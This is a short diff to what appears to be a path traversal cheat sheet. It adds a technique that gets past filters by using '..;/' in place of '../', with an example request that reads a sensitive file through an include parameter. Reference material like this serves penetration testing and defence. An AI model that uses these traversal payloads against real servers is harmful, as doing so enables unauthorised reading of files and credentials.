@@ -9,11 +9,13 @@
     * [16 bits Unicode encoding](#)
     * [UTF-8 Unicode encoding](#)
     * [Bypass "../" replaced by ""](#)
+    * [Bypass "../" with ";"](#)
     * [Double URL encoding](#)
     * [UNC Bypass](#unc-bypass)
 * [Path Traversal](#path-traversal)
     * [Interesting Linux files](#)
     * [Interesting Windows files](#)
+* [References](#references)
 
 ## Tools
 
@@ -60,6 +62,13 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 ```powershell
 ..././
 ...\.\
+```
+
+### Bypass "../" with ";"
+
+```powershell
+..;/
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
 ```
 
 ### Double URL encoding
